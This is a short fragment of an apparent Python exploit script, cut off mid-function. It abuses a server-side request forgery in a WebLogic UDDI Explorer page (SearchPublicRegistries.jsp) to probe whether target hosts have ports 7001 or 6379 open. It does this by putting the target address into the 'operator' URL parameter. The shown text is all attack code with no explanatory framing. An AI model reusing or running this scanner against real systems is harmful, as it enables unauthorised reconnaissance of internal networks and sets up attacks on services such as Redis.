...
def scan(ip_str):
  ports = ('7001','6379')
  for port in ports:
    exp_url = "http://192.168.232.137:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"%(ip_str,port)
    try:
